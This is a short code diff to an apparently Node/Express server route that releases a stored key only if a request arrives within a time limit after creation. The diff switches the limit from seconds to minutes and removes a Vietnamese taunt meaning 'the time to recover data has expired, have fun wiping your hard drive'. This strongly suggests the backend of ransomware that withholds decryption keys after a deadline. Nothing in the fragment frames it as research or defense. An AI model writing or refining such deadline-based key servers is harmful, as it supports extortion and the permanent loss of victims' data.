@@ -93,10 +93,10 @@ app.post('/valid',async (req,res)=>{
   .then((doc) => {
     const epochLocal = Math.floor(new Date().getTime() / 1000);
     const epochUser = Math.floor(doc.createdAt);
-    const diff = (epochLocal - epochUser);
+    const diff = (epochLocal - epochUser)/60;
     console.table(diff)
     if(diff > 60){
-      res.status(500).send("Thời gian để khôi phục dữ liệu đã hết !!!! Chúc bạn xoá ổ cứng vui vẻ")
+      res.status(500).send()
     }
     else{
       res.status(200).send(doc.key)
